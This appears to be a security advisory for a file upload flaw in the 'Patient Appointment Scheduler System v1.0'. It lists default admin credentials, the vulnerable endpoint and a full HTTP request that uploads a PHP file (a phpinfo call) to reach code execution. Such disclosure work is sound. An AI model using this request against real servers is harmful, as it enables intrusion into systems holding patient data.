# Patient Appointment Scheduler System v1.0 by sourcecodester has arbitrary code execution (RCE)

BUG_Author: Liu Lanling

vendors: https://www.sourcecodester.com/php/14928/patient-appointment-scheduler-system-using-php-free-source-code.html

The program is built using the xmapp-php8.1 version

Login account: admin/admin123 (Super Admin account)

Vulnerability url: ip/scheduler/classes/SystemSettings.php?f=update_settings

Loophole location: arbitrary file upload exists in Patient Appointment Scheduler System file (RCE).

Request package for file upload：

```sql
POST /scheduler/classes/SystemSettings.php?f=update_settings HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.88/scheduler/admin/?page=system_info
Content-Length: 4410
Content-Type: multipart/form-data; boundary=---------------------------1153432572319
Cookie: PHPSESSID=mjsuoc4jice3ps6orhn4u8t5vk
Connection: close

-----------------------------1153432572319
Content-Disposition: form-data; name="name"

Patient Appointment Scheduler System - PHP
-----------------------------1153432572319
Content-Disposition: form-data; name="short_name"

PASS-PHP
-----------------------------1153432572319
Content-Disposition: form-data; name="about_us"

<h1 style="text-align: center; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; padding: 0px; line-height: 90px;"><span style="font-family: "Arial Black";">About Us</span></h1><h4 style="margin: 10px 10px 5px; padding: 0px; line-height: 18px;"><br></h4><hr style="margin: 0px; padding: 0px; clear: both; border-top: 0px; height: 1px; background-image: linear-gradient(to right, rgba(0, 0, 0, 0), rgba(0, 0, 0, 0.75), rgba(0, 0, 0, 0)); font-family: "Open Sans", Arial, sans-serif; font-size: 14px; text-align: center;"><div id="Content" style="margin: 0px; padding: 0px; position: relative; font-family: "Open Sans", Arial, sans-serif; font-size: 14px; text-align: center;"><div id="bannerL" style="margin: 0px 0px 0px -160px; padding: 0px; position: sticky; top: 20px; width: 160px; height: 10px; float: left; text-align: right;"></div><div id="bannerR" style="margin: 0px -160px 0px 0px; padding: 0px; position: sticky; top: 20px; width: 160px; height: 10px; float: right; text-align: left;"></div><div class="boxed" style="margin: 10px 28.7969px; padding: 0px; clear: both;"><div id="lipsum" style="margin: 0px; padding: 0px; text-align: justify;"><p style="margin-right: 0px; margin-bottom: 15px; margin-left: 0px; padding: 0px;">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nunc enim felis, consequat id mauris sit amet, finibus tristique justo. Maecenas vel ligula eget tellus pulvinar vestibulum. Sed feugiat pharetra dolor sit amet tincidunt. Quisque dictum turpis eu ipsum euismod, quis suscipit neque iaculis. Nunc dignissim porttitor urna, vitae suscipit erat congue nec. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Etiam faucibus pellentesque enim, eget faucibus leo mattis eu. In eleifend turpis tortor, vel accumsan est rhoncus imperdiet. Aenean laoreet diam metus.</p><p style="margin-right: 0px; margin-bottom: 15px; margin-left: 0px; padding: 0px;">Pellentesque pulvinar augue dui, eget egestas arcu tincidunt nec. Curabitur aliquet, nisl sit amet ullamcorper malesuada, neque quam lobortis ante, non rutrum dolor sem non purus. Maecenas sed vehicula libero, condimentum malesuada quam. Ut nec vehicula lorem. Orci varius natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Aliquam id diam quis lacus pretium facilisis eu molestie ligula. Mauris a ornare massa. Integer scelerisque, nisl at consectetur ornare, ipsum risus vehicula arcu, quis malesuada metus dui vel tellus. Vivamus euismod, erat pharetra cursus egestas, erat sem consequat eros, eu cursus justo mi sit amet nisi. Nullam sed magna metus. Duis elementum, metus a imperdiet faucibus, arcu libero consectetur quam, a convallis lacus lorem in nisl. Aliquam enim orci, blandit vel ligula ac, suscipit dictum dolor. Maecenas vitae tortor cursus, hendrerit lectus vel, ultricies ante. Suspendisse aliquam bibendum nisl, eu condimentum nibh congue a.</p><p style="margin-right: 0px; margin-bottom: 15px; margin-left: 0px; padding: 0px;">Fusce eu viverra tortor. Cras imperdiet gravida eros in imperdiet. Proin varius orci aliquet, laoreet tortor in, posuere magna. Nullam sem ex, gravida eu eros vel, rutrum porta leo. Donec sit amet sapien fermentum, tempus lectus id, pretium ipsum. Etiam dignissim nunc eget congue rutrum. Morbi lorem augue, sollicitudin ut massa a, imperdiet semper lectus. Proin tellus ante, ornare vitae ligula quis, interdum porta magna. Ut lorem elit, laoreet vitae ex eget, blandit pulvinar mauris. Cras non elementum enim. Interdum et malesuada fames ac ante ipsum primis in faucibus.</p></div></div></div>
-----------------------------1153432572319
Content-Disposition: form-data; name="files"; filename=""
Content-Type: application/octet-stream


-----------------------------1153432572319
Content-Disposition: form-data; name="img"; filename="1.php"
Content-Type: application/octet-stream

<?php phpinfo();
-----------------------------1153432572319
Content-Disposition: form-data; name="cover"; filename=""
Content-Type: application/octet-stream


-----------------------------1153432572319--

```

The files will be uploaded to this directory \scheduler\uploads

<img width="388" height="287" alt="image" src="https://github.com/user-attachments/assets/7d680ddf-6e14-407b-a477-e66f95a6bbcb" />


We visited the directory of the file in the browser and found that the code had been executed

<img width="1430" height="676" alt="image" src="https://github.com/user-attachments/assets/2b5cafbe-9c77-4828-a2a5-5c7fed6d05a2" />
